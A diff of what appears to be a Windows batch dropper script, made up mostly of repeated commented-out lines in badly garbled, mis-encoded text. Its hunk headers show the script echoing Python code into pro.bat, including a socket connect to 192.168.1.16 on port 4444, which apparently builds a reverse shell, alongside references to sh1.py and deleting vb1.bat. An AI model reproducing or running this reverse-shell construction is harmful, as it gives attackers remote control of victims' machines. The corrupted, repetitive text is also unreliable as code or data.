@@ -3,23 +3,12 @@
 @REM @yÈh off
 @REM cd %µé©%
 @REM yÈh @yÈh off  ([µÛ]£.bat
-@REM yÈh cd %µé©%  ([µÛ]£.bat
-@REM yÈh :)  ([µÛ]£.bat
-@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
 @REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
 @REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
 @REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
 @REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
 @REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
 @REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
-@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
-@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
-@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]£.bat
-@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
-@REM @yÈh off
-@REM cd %µé©%
-@REM yÈh @yÈh off  ([µÛ]£.bat
-@REM yÈh cd %µé©%  ([µÛ]£.bat
 @REM yÈh :)  ([µÛ]£.bat
 @REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
 @REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
@@ -43,12 +32,6 @@ echo            echo import os >> pro.bat
 @REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
 @REM @yÈh off
 @REM cd %µé©%
-@REM yÈh @yÈh off  ([µÛ]£.bat
-@REM yÈh cd %µé©%  ([µÛ]£.bat
-@REM yÈh :)  ([µÛ]£.bat
-@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
-@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
-@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
 @REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
 @REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
 @REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
@@ -58,9 +41,6 @@ echo            echo import os >> pro.bat
 @REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]£.bat
 @REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
 @REM @yÈh off
-@REM cd %µé©%
-@REM yÈh @yÈh off  ([µÛ]£.bat
-@REM yÈh cd %µé©%  ([µÛ]£.bat
 @REM yÈh :)  ([µÛ]£.bat
 @REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
 @REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
@@ -101,24 +81,6 @@ echo            echo        s.connect^^(^^('192.168.1.16', 4444^^)^^) >> pro.bat
 @REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
 @REM @yÈh off
 @REM cd %µé©%
-@REM yÈh @yÈh off  ([µÛ]£.bat
-@REM yÈh cd %µé©%  ([µÛ]£.bat
-@REM yÈh :)  ([µÛ]£.bat
-@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
-@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
-@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
-@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
-@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
-@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
-@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
-@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
-@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
-@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]£.bat
-@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
-@REM @yÈh off
-@REM cd %µé©%
-@REM yÈh @yÈh off  ([µÛ]£.bat
-@REM yÈh cd %µé©%  ([µÛ]£.bat
 @REM yÈh :)  ([µÛ]£.bat
 @REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
 @REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
